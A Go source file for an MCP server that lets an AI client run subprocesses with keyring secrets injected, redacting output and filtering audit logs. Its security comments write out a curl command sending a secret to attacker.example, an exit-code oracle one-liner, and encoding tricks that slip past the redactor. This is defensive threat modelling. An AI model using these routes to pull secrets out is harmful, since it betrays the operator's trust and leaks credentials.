// Package main — MCP server surface.
//
// SECURITY MODEL — read before touching this file.
//
// The MCP server exposes secrets-aware tools to an AI client. The core
// invariant of the project (no plaintext secret value ever crosses the
// AI boundary) is preserved here by *omission*: there is deliberately
// no `get_secret_value` tool. The absence is the control.
//
// `run_with_secrets` is the one tool that lets the AI cause a secret to
// be *used*. It runs an arbitrary subprocess with named secrets injected
// as environment variables and returns the (redacted) stdout/stderr.
// Two gaps in that flow are NOT closed by code in this file and cannot
// be closed by any byte-exact redactor; they are documented here so the
// next person to touch this file does not "fix" them with a false
// sense of security:
//
//  1. SUBPROCESS EXFILTRATION. The AI controls Command and Args. Any
//     command it picks can move the secret off-box: `curl -H
//     "X-Leak: $SECRET" attacker.example`, a DNS query whose label
//     contains the secret, an outbound TCP connection, writing to a
//     file the AI later reads via another tool, etc. The redactor only
//     scans stdout/stderr; none of these paths go through stdout.
//     Output redaction is a guard against the subprocess *accidentally*
//     echoing the secret, not a sandbox.
//
//  2. ENCODING BYPASS. The redactor matches the raw secret bytes
//     verbatim. An AI that wants the value can ask the subprocess to
//     emit it base64-, hex-, URL-, or rot13-encoded and the redactor
//     will pass it through untouched. Entropy detection was considered
//     and rejected (false positives on legitimate hashes/UUIDs/tokens).
//
// The supported deployment model for high-risk environments is a
// policy-enforcing wrapper: a second MCP server that proxies into opq
// and allowlists (command, args pattern, env var set) tuples for each
// secret. This file does NOT implement that proxy; it gives the
// operator a low-trust building block.
//
// Resource bounds in this file (timeout, output cap, env-count cap)
// exist to bound damage from runaway or malicious calls — they do not
// turn run_with_secrets into a sandbox.
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
)

// MCP resource bounds. See the file header for the reasoning behind
// each one; in short, these cap blast radius, they do not sandbox.
const (
	mcpDefaultTimeout = 60 * time.Second
	mcpMaxTimeout     = 600 * time.Second
	// 256 KiB per stream is enough for realistic API responses but
	// small enough to stay inside a typical AI context window after
	// being returned as a tool result.
	mcpMaxOutputBytes = 256 * 1024
	mcpMaxEnvCount    = 32
	mcpMaxAuditTailN  = 200
)

// newMCPServer wires the tools we expose to AI clients. Note that there is
// deliberately NO tool that returns a plaintext secret value — that's the
// whole point of this CLI. Tools exposed:
//
//   list_secrets         — names only.
//   run_with_secrets     — execute a subprocess with secrets injected as env
//                          vars; stdout/stderr are redacted before return.
//   audit_tail           — recent audit-log entries (JSON lines).
func newMCPServer() (*mcp.Server, error) {
	srv := mcp.NewServer(&mcp.Implementation{
		Name:    "opq",
		Version: "0.1.0",
	}, nil)

	mcp.AddTool(srv, &mcp.Tool{
		Name:        "list_secrets",
		Description: "List the names of secrets available in the user's keyring. Values are never returned.",
	}, handleListSecrets)

	mcp.AddTool(srv, &mcp.Tool{
		Name: "run_with_secrets",
		Description: strings.Join([]string{
			"Run a subprocess with named secrets injected as environment variables.",
			"The plaintext value of each secret is NEVER returned to the caller; subprocess stdout/stderr is byte-redacted before being returned.",
			"NETWORK SANDBOX (DEFAULT): the subprocess runs inside a network namespace with NO external connectivity — DNS lookups, TCP/UDP/IP egress, and outbound HTTP all fail. Set `allow_network=true` ONLY when the command's purpose is to reach the network (e.g. an API call). When you opt in, the call is recorded in the operator's audit log as `network_allowed`.",
			"FILESYSTEM ISOLATION (opt-in): set `isolation=\"full\"` to additionally replace /home and /tmp with empty tmpfs mounts (only minimal /usr, /etc, /lib, /lib64, /bin, /sbin are exposed read-only). Use this when you want defense in depth against the subprocess reading other files on the host.",
			"SECURITY CAVEATS — read before relying on this tool:",
			"(1) Even with the network sandbox, the subprocess shares the kernel with the host. Loopback channels, kernel-keyring inheritance, and timing side-channels are NOT blocked.",
			"(2) The redactor is byte-exact. base64/hex/URL-encoded forms of a secret will NOT be redacted.",
			"(3) The output you receive does not reveal which secrets were resolved or their values; that information is in the operator's audit log only.",
			"Use this whenever you need a tool to consume an API key, token, or password — but assume the operator is treating any command you run as authorized use of every secret you ask for.",
		}, " "),
	}, handleRunWithSecrets)

	mcp.AddTool(srv, &mcp.Tool{
		Name:        "audit_tail",
		Description: "Return the most recent opaque audit-log entries as JSON-line strings. Capped at 200 entries per call.",
	}, handleAuditTail)

	return srv, nil
}

func runMCPServer(ctx context.Context, srv *mcp.Server) error {
	err := srv.Run(ctx, &mcp.StdioTransport{})
	// A stdio MCP server shuts down when its peer closes stdin or the
	// context is canceled. Both are normal end-of-session, not failures.
	if err == nil || errors.Is(err, io.EOF) || errors.Is(err, context.Canceled) {
		return nil
	}
	return err
}

// ----- list_secrets -----

type listSecretsInput struct{}

type listSecretsOutput struct {
	Names []string `json:"names"`
}

func handleListSecrets(ctx context.Context, _ *mcp.CallToolRequest, _ listSecretsInput) (*mcp.CallToolResult, listSecretsOutput, error) {
	backend, err := OpenDefaultBackend()
	if err != nil {
		// H1: backend errors may contain keyring/D-Bus text; sanitize.
		return aiErr("backend_error"), listSecretsOutput{}, nil
	}
	names, err := backend.List(ctx)
	if err != nil {
		// H1: backend errors may contain keyring/D-Bus text; sanitize.
		return aiErr("backend_error"), listSecretsOutput{}, nil
	}
	_ = AppendAudit(AuditEvent{Action: ActionList, Caller: callerTag()})
	return &mcp.CallToolResult{
		Content: []mcp.Content{&mcp.TextContent{Text: strings.Join(names, "\n")}},
	}, listSecretsOutput{Names: names}, nil
}

// ----- run_with_secrets -----

type runWithSecretsInput struct {
	Command        string            `json:"command" jsonschema:"executable to run (absolute path or name resolvable via PATH)"`
	Args           []string          `json:"args,omitempty" jsonschema:"arguments to pass to the command"`
	Env            map[string]string `json:"env" jsonschema:"mapping of ENV_VAR_NAME -> secret_name; the named secret's value will be set in the subprocess environment. Max 32 entries."`
	TimeoutSeconds int               `json:"timeout_seconds,omitempty" jsonschema:"per-call wall-clock timeout in seconds. Defaults to 60. Capped at 600."`
	AllowNetwork   bool              `json:"allow_network,omitempty" jsonschema:"if true, the subprocess runs WITHOUT a network sandbox and can reach external hosts; default false (network blocked)"`
	Isolation      string            `json:"isolation,omitempty" jsonschema:"filesystem isolation: 'net' (default; host FS passthrough) or 'full' (tmpfs /home, /tmp; minimal ro-binds)"`
}

// resolveMCPSandbox maps the (AllowNetwork, Isolation) pair to a
// SandboxProfile. The default (both unset) is SandboxNet — the AI
// gets the secret but cannot ship it off-box.
//
//   AllowNetwork=true  + Isolation=""|"net" -> SandboxNone (audit network_allowed)
//   AllowNetwork=true  + Isolation="full"   -> error (incompatible in v1.1)
//   AllowNetwork=false + Isolation=""|"net" -> SandboxNet (default)
//   AllowNetwork=false + Isolation="full"   -> SandboxFull
func resolveMCPSandbox(allowNetwork bool, isolation string) (SandboxProfile, error) {
	iso := isolation
	if iso == "" {
		iso = "net"
	}
	switch iso {
	case "net", "full":
	default:
		return SandboxNone, fmt.Errorf("unknown isolation %q (want net|full)", isolation)
	}
	if allowNetwork {
		if iso == "full" {
			return SandboxNone, fmt.Errorf("isolation=full is incompatible with allow_network=true until v1.2")
		}
		return SandboxNone, nil
	}
	if iso == "full" {
		return SandboxFull, nil
	}
	return SandboxNet, nil
}

// runWithSecretsOutput is the structured result handed back to the AI.
//
// ExitCode is deliberately normalized to {0,1}: returning the raw 8-bit
// status would turn it into an oracle the AI could use to leak one byte
// per call via `exit $(printf '%d' "'${SECRET:0:1}")`. The raw status is
// recorded in the audit log for the human operator.
type runWithSecretsOutput struct {
	Succeeded       bool   `json:"succeeded"`
	ExitCode        int    `json:"exit_code"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
	TimedOut        bool   `json:"timed_out"`
}

// normalizeExit collapses a raw subprocess exit code to the (Succeeded,
// ExitCode) pair exposed to the AI. Raw == 0 means success; anything
// else (including signal-kills and timeouts mapped to nonzero) becomes
// 1. This is the entire exit-code oracle defense.
func normalizeExit(raw int) (bool, int) {
	if raw == 0 {
		return true, 0
	}
	return false, 1
}

// clampTimeout resolves the requested per-call timeout. Zero or
// negative requests fall back to the default; values above the ceiling
// are clamped down silently rather than rejected, since the AI cannot
// usefully react to a timeout-too-large error.
func clampTimeout(requestedSeconds int) time.Duration {
	if requestedSeconds <= 0 {
		return mcpDefaultTimeout
	}
	d := time.Duration(requestedSeconds) * time.Second
	if d > mcpMaxTimeout {
		return mcpMaxTimeout
	}
	return d
}

// clampAuditTailN normalizes the AI's requested tail size. Zero or
// negative falls back to the default; values above the ceiling are
// clamped to keep audit_tail from being a wholesale-history enumeration
// channel.
func clampAuditTailN(requested int) int {
	if requested <= 0 {
		return 20
	}
	if requested > mcpMaxAuditTailN {
		return mcpMaxAuditTailN
	}
	return requested
}

func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input runWithSecretsInput) (*mcp.CallToolResult, runWithSecretsOutput, error) {
	if input.Command == "" {
		// H1: user-controlled input validation — safe to return as-is.
		return aiUserErr("command is required"), runWithSecretsOutput{}, nil
	}
	if len(input.Env) > mcpMaxEnvCount {
		// H1: user-controlled input validation — safe to return as-is.
		return aiUserErr(fmt.Sprintf("too many env vars in one call (%d > %d)", len(input.Env), mcpMaxEnvCount)), runWithSecretsOutput{}, nil
	}

	profile, err := resolveMCPSandbox(input.AllowNetwork, input.Isolation)
	if err != nil {
		// H1: validation text is entirely our own literals; safe.
		return aiUserErr(err.Error()), runWithSecretsOutput{}, nil
	}
	if profile != SandboxNone {
		if err := VerifySandboxAvailable(); err != nil {
			// H1: may contain bwrap binary path or OS error; sanitize.
			return aiErr("sandbox_unavailable"), runWithSecretsOutput{}, nil
		}
	}
	if input.AllowNetwork {
		_ = AppendAudit(AuditEvent{
			Action:  ActionNetworkAllowed,
			Caller:  callerTag(),
			Message: fmt.Sprintf("command=%s args=%d", filepath.Base(input.Command), len(input.Args)),
		})
	}

	backend, err := OpenDefaultBackend()
	if err != nil {
		// H1: may contain keyring/D-Bus text; sanitize.
		return aiErr("backend_error"), runWithSecretsOutput{}, nil
	}

	type resolved struct {
		envName string
		buf     *Buffer
	}
	var bufs []resolved
	defer func() {
		for _, b := range bufs {
			b.buf.Destroy()
		}
	}()

	resolvedSecretNames := make([]string, 0, len(input.Env))
	for envName, secretName := range input.Env {
		if !validEnvName(envName) {
			// H1: envName is AI-supplied but we already validated it is a
			// simple identifier; safe to echo back for diagnostics.
			return aiUserErr(fmt.Sprintf("invalid env var name %q", envName)), runWithSecretsOutput{}, nil
		}
		buf, err := backend.Get(ctx, secretName)
		if err != nil {
			// Audit with full error detail for the operator; AI sees only taxonomy.
			_ = AppendAudit(AuditEvent{Action: ActionDenied, SecretName: secretName, Caller: callerTag(), Message: sanitizeBackendErr(err)})
			// H1: include secretName (AI supplied it) but not the backend error.
			if errors.Is(err, ErrSecretNotFound) {
				return aiErr("not_found: " + secretName), runWithSecretsOutput{}, nil
			}
			return aiErr("backend_error"), runWithSecretsOutput{}, nil
		}
		bufs = append(bufs, resolved{envName: envName, buf: buf})
		resolvedSecretNames = append(resolvedSecretNames, secretName)
	}

	childEnv := filterParentEnv(envFromMap()) // empty parent inheritance under MCP
	// MCP children have no inherited env, so common tools (curl, sh) would
	// fail to locate themselves or a HOME. Provide safe defaults so the
	// sandbox doesn't trip on missing PATH/HOME. These are inert under
	// SandboxFull (bwrap --setenv overrides them) and harmless otherwise.
	childEnv = append(childEnv, "PATH=/usr/bin:/usr/sbin:/bin:/sbin", "HOME=/tmp")
	for _, r := range bufs {
		childEnv = append(childEnv, r.envName+"="+string(r.buf.Bytes()))
	}

	// Output pipeline: subprocess writes -> RedactingWriter -> cappedWriter
	//   -> bytes.Buffer. The redactor MUST sit upstream of the cap so the
	// cap clips only already-redacted bytes; otherwise a long
	// non-secret prefix could fill the buffer, push the secret-bearing
	// suffix past the cap, and lose only the redacted form. We accept
	// that the redactor scans bytes the cap will drop (see file header).
	var stdoutBuf, stderrBuf bytes.Buffer
	stdoutCap := newCappedWriter(&stdoutBuf, mcpMaxOutputBytes)
	stderrCap := newCappedWriter(&stderrBuf, mcpMaxOutputBytes)
	named := make([]NamedSecret, 0, len(bufs))
	for _, r := range bufs {
		named = append(named, NamedSecret{Name: r.envName, Value: r.buf.Bytes()})
	}
	stdoutRW := NewRedactingWriter(stdoutCap, named)
	stderrRW := NewRedactingWriter(stderrCap, named)
	defer stdoutRW.Destroy()
	defer stderrRW.Destroy()

	timeout := clampTimeout(input.TimeoutSeconds)
	runCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	execCmd, execArgs, err := WrapCommand(profile, input.Command, input.Args)
	if err != nil {
		// H1: WrapCommand may include sandbox binary paths; sanitize.
		return aiErr("sandbox_unavailable"), runWithSecretsOutput{}, nil
	}

	start := time.Now()
	cmd := exec.CommandContext(runCtx, execCmd, execArgs...)
	cmd.Env = childEnv
	cmd.Stdout = stdoutRW
	cmd.Stderr = stderrRW

	runErr := cmd.Run()
	elapsed := time.Since(start)
	_ = stdoutRW.Flush()
	_ = stderrRW.Flush()

	rawExit := 0
	timedOut := errors.Is(runCtx.Err(), context.DeadlineExceeded)
	if runErr != nil {
		var ee *exec.ExitError
		if errors.As(runErr, &ee) {
			rawExit = ee.ExitCode()
		} else if timedOut {
			// Timeout-killed process may not surface as ExitError on
			// every platform; record a non-zero raw code for the audit
			// log so the operator can see it.
			rawExit = -1
		} else {
			// Process never started (bad path, permission denied, ...).
			// Still emit the audit entry below, then return a sanitized MCP
			// error so the AI sees a clean failure without OS error text.
			_ = AppendAudit(AuditEvent{
				Action:  ActionMCPRun,
				Caller:  callerTag(),
				Message: auditMCPRunMessage(resolvedSecretNames, -1, stdoutCap.Truncated(), stderrCap.Truncated(), false, elapsed, "start failed: "+sanitizeExecStartErr(runErr)),
			})
			// H1: runErr may contain binary paths or OS error text; sanitize.
			return aiErr(sanitizeErrForAI(runErr)), runWithSecretsOutput{}, nil
		}
	}

	succeeded, normalizedExit := normalizeExit(rawExit)
	if timedOut {
		// A timed-out run is never "successful" from the AI's POV,
		// even if the child happened to flush a zero exit before the
		// kernel killed it.
		succeeded = false
		normalizedExit = 1
	}

	out := runWithSecretsOutput{
		Succeeded:       succeeded,
		ExitCode:        normalizedExit,
		Stdout:          stdoutBuf.String(),
		Stderr:          stderrBuf.String(),
		StdoutTruncated: stdoutCap.Truncated(),
		StderrTruncated: stderrCap.Truncated(),
		TimedOut:        timedOut,
	}

	_ = AppendAudit(AuditEvent{
		Action:  ActionMCPRun,
		Caller:  callerTag(),
		Message: auditMCPRunMessage(resolvedSecretNames, rawExit, out.StdoutTruncated, out.StderrTruncated, timedOut, elapsed, ""),
	})

	exitLabel := "success"
	if !succeeded {
		exitLabel = "failure"
	}
	textParts := []string{fmt.Sprintf("exit=%s", exitLabel)}
	if timedOut {
		textParts = append(textParts, "timed_out=true")
	}
	if out.StdoutTruncated {
		textParts = append(textParts, "stdout_truncated=true")
	}
	if out.StderrTruncated {
		textParts = append(textParts, "stderr_truncated=true")
	}
	header := strings.Join(textParts, " ")
	return &mcp.CallToolResult{
		Content: []mcp.Content{&mcp.TextContent{Text: fmt.Sprintf("%s\n--- stdout ---\n%s\n--- stderr ---\n%s", header, out.Stdout, out.Stderr)}},
	}, out, nil
}

// auditMCPRunMessage formats the human-operator-facing summary written
// to the audit log after a run_with_secrets call. Includes the raw
// exit code (so operators retain debugging signal that the AI never
// sees), elapsed wall-clock, and any truncation/timeout flags.
func auditMCPRunMessage(secrets []string, rawExit int, stdoutTrunc, stderrTrunc, timedOut bool, elapsed time.Duration, extra string) string {
	parts := []string{
		fmt.Sprintf("secrets=%s", strings.Join(secrets, ",")),
		fmt.Sprintf("raw_exit=%d", rawExit),
		fmt.Sprintf("elapsed_ms=%d", elapsed.Milliseconds()),
	}
	if stdoutTrunc {
		parts = append(parts, "stdout_truncated=true")
	}
	if stderrTrunc {
		parts = append(parts, "stderr_truncated=true")
	}
	if timedOut {
		parts = append(parts, "timed_out=true")
	}
	if extra != "" {
		parts = append(parts, extra)
	}
	return strings.Join(parts, " ")
}

// envFromMap returns an empty slice for now. We intentionally do NOT
// inherit the MCP server's parent environment into subprocesses; the AI
// must declare every env var it wants, and only secret-backed values can
// be injected. If a future need to pass through specific vars arises,
// add an allowlist field to runWithSecretsInput.
func envFromMap() []string { return nil }

// ----- cappedWriter -----

// cappedWriter forwards bytes to an inner writer up to a fixed cap,
// then silently drops further bytes and records a truncated flag. It
// is the outermost layer of the run_with_secrets output pipeline and
// exists solely to bound memory growth — bytes that reach this writer
// have already been through the redactor.
type cappedWriter struct {
	mu        sync.Mutex
	inner     io.Writer
	remaining int
	truncated bool
}

func newCappedWriter(inner io.Writer, cap int) *cappedWriter {
	return &cappedWriter{inner: inner, remaining: cap}
}

func (c *cappedWriter) Write(p []byte) (int, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.remaining <= 0 {
		c.truncated = true
		return len(p), nil
	}
	if len(p) <= c.remaining {
		n, err := c.inner.Write(p)
		c.remaining -= n
		return n, err
	}
	// Partial: write what fits, drop the rest, flip the flag.
	take := p[:c.remaining]
	n, err := c.inner.Write(take)
	c.remaining -= n
	c.truncated = true
	if err != nil {
		return n, err
	}
	return len(p), nil
}

// Truncated reports whether any bytes were dropped due to the cap.
func (c *cappedWriter) Truncated() bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.truncated
}

// ----- audit_tail -----

type auditTailInput struct {
	N int `json:"n,omitempty" jsonschema:"number of trailing entries; default 20, capped at 200"`
}

type auditTailOutput struct {
	Entries []string `json:"entries"`
}

func handleAuditTail(_ context.Context, _ *mcp.CallToolRequest, input auditTailInput) (*mcp.CallToolResult, auditTailOutput, error) {
	// Over-fetch from the log so that after the MCP-caller filter is applied
	// we still return up to n entries. In the worst case all entries are CLI
	// entries and we return an empty list — that is correct behaviour.
	n := clampAuditTailN(input.N)
	lines, err := tailAudit(mcpMaxAuditTailN)
	if err != nil {
		// H1: tailAudit error may contain file-system paths; sanitize.
		return aiErr("internal_error"), auditTailOutput{}, nil
	}

	// Apply MCP-specific filters (M3 caller filter, C1 raw_exit strip).
	filtered := make([]string, 0, len(lines))
	for _, line := range lines {
		if out, ok := filterAuditLineForAI(line); ok {
			filtered = append(filtered, out)
		}
	}
	// Return at most the requested n entries (last n after filter).
	if len(filtered) > n {
		filtered = filtered[len(filtered)-n:]
	}

	return &mcp.CallToolResult{
		Content: []mcp.Content{&mcp.TextContent{Text: strings.Join(filtered, "\n")}},
	}, auditTailOutput{Entries: filtered}, nil
}

// sanitizeErrForAI converts any error into a fixed-taxonomy string that is
// safe to surface to an MCP caller. The original error is preserved for the
// audit log; only the AI-visible CallToolResult uses the sanitized form.
//
// Call context: this helper is reached from handleRunWithSecrets ONLY for
// process-start failures (cmd.Run errors not matching *exec.ExitError and
// not timed out). The fallthrough is therefore exec_start_failed, not a
// generic catch-all. Backend errors and sandbox-unavailable errors are
// mapped to fixed strings at their own call sites (see "backend_error" and
// "sandbox_unavailable" literals in this file).
//
// Taxonomy keys (stable interface — do not change without a version bump):
//
//	not_found                 — named secret does not exist
//	exec_not_found            — command binary not found on PATH
//	exec_permission_denied    — binary exists but not executable
//	exec_start_failed         — other process-start failure (fallback)
func sanitizeErrForAI(err error) string {
	if err == nil {
		return ""
	}
	if errors.Is(err, ErrSecretNotFound) {
		return "not_found"
	}
	if errors.Is(err, exec.ErrNotFound) {
		return "exec_not_found"
	}
	if errors.Is(err, fs.ErrPermission) {
		return "exec_permission_denied"
	}
	return "exec_start_failed"
}

// aiErr returns an IsError CallToolResult with a sanitized, fixed-taxonomy
// error string. Use this for all errors that may carry backend or system
// bytes (backend errors, exec start errors, sandbox errors, audit errors).
// The original err is NOT exposed to the AI; log it via AppendAudit before
// calling aiErr if operator visibility is needed.
func aiErr(sanitized string) *mcp.CallToolResult {
	return &mcp.CallToolResult{
		IsError: true,
		Content: []mcp.Content{&mcp.TextContent{Text: sanitized}},
	}
}

// aiUserErr returns an IsError CallToolResult with caller-controlled text
// (e.g. input-validation messages). Use this ONLY for errors whose text is
// composed entirely of literals or values the AI itself supplied — never for
// errors that may carry backend or system bytes.
func aiUserErr(msg string) *mcp.CallToolResult {
	return &mcp.CallToolResult{
		IsError: true,
		Content: []mcp.Content{&mcp.TextContent{Text: msg}},
	}
}

// filterAuditLineForAI applies two MCP-specific filters to a single raw
// audit-log JSON line before returning it to an AI caller:
//
//  1. (M3) caller filter — drops any line whose "caller" field does not have
//     the prefix "mcp". CLI-driven entries (get/set/delete, redaction_disabled,
//     gate-failure details, sandbox profiles chosen by the human) are invisible
//     to the AI. The prefix match is future-proof for session IDs ("mcp:abc").
//
//  2. (C1) raw_exit strip — for "mcp_run" entries, removes all space-separated
//     tokens whose key prefix is "raw_exit" from the "msg" field. This closes
//     the exit-code oracle: normalizeExit already withholds raw_exit from the
//     run_with_secrets response, but the AI could read it back via audit_tail
//     without this strip.
//
// Returns ("", false) if the line should be dropped entirely.
// Returns (filtered, true) with raw_exit stripped if the line should be included.
func filterAuditLineForAI(line string) (string, bool) {
	// Fast path: skip obviously empty lines.
	if strings.TrimSpace(line) == "" {
		return "", false
	}

	var ev AuditEvent
	if err := json.Unmarshal([]byte(line), &ev); err != nil {
		// Unparseable lines are dropped rather than forwarded; they could
		// contain arbitrary bytes from a future or corrupt log format.
		return "", false
	}

	// M3: only MCP-originated entries are visible to the AI.
	if !strings.HasPrefix(ev.Caller, "mcp") {
		return "", false
	}

	// C1: strip raw_exit* tokens from mcp_run messages.
	if ev.Action == ActionMCPRun && ev.Message != "" {
		ev.Message = stripRawExitTokens(ev.Message)
	}

	out, err := json.Marshal(ev)
	if err != nil {
		// Should never happen with a valid AuditEvent, but be safe.
		return "", false
	}
	return string(out), true
}

// stripRawExitTokens removes any space-separated token from msg whose key
// (the part before '=') has the prefix "raw_exit". This handles the current
// "raw_exit=NN" format as well as any future variant (raw_exit_hex, etc.).
func stripRawExitTokens(msg string) string {
	tokens := strings.Fields(msg)
	out := tokens[:0]
	for _, tok := range tokens {
		key, _, _ := strings.Cut(tok, "=")
		if strings.HasPrefix(key, "raw_exit") {
			continue
		}
		out = append(out, tok)
	}
	return strings.Join(out, " ")
}

